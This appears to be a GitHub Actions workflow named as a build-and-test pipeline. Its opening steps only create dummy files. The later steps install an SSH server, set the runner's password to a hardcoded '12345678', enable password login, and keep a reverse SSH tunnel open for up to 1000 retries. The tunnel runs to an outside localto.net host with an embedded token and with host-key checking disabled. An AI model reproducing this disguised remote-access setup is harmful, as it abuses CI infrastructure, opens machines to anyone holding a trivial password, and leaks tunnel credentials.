name: Build and Test Pipeline

on: workflow_dispatch

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 9999

    steps:
      - name: Initialize Workspace
        run: |
          for i in {1..8}; do 
            mkdir -p "/tmp/Init$i"
            echo "Created /tmp/Init$i"
          done

      - name: Prepare Build Files
        run: |
          for i in {1..8}; do 
            echo "Dummy data" > "/tmp/BuildFile$i.txt"
            echo "Created /tmp/BuildFile$i.txt"
          done

      - name: Configure SSH for Termux
        run: |
          echo "=== Installing OpenSSH Server ==="
          sudo apt-get update -qq
          sudo apt-get install -y openssh-server
          
          # Fixed 8-digit password
          password=12345678
          echo "=== SSH PASSWORD: $password ==="
          echo "=== এই পাসওয়ার্ডটা সেভ করে রাখো! ==="
          
          echo "runner:$password" | sudo chpasswd
          
          # Enable password authentication
          sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
          sudo systemctl enable --now ssh
          sudo systemctl restart ssh
          
          echo "✅ SSH Server ready on port 22"

      - name: Start Tunnel (SSH on port 1119)
        run: |
          echo "Starting SSH reverse tunnel with NEW TOKEN (port 1119)..."
          maxRetries=1000
          retryCount=0

          while [ $retryCount -lt $maxRetries ]; do
              echo "Establishing SSH Tunnel... (Attempt: $((retryCount+1)))"
              
              ssh -o ServerAliveInterval=60 \
                  -o ServerAliveCountMax=3 \
                  -o StrictHostKeyChecking=no \
                  -p 223 \
                  lGQouQZvqohqeUmZg6jc-nsuc2uPRr-_9UHnOSMPSnQk6qxE32VnkiSUU8zpIrHmZ2rt5SgHEWj2hkVNovX-JA@rta5anplv.localto.net \
                  -R1119:127.0.0.1:22 \
                  -N || true
              
              sleep 5
              retryCount=$((retryCount + 1))
          done
